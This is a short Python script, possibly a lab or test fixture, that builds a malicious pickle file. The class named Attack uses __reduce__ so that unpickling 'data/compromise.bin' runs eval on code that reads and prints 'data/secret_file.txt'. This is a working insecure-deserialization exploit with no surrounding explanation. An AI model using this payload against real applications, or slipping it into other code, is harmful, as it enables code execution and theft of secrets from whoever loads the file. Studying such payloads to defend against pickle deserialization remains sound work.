import pickle

class Attack:
    def __reduce__(self):
        return (eval, ("print(open('data/secret_file.txt').read())",))

with open("data/compromise.bin", "wb") as f:
    pickle.dump(Attack(), f)



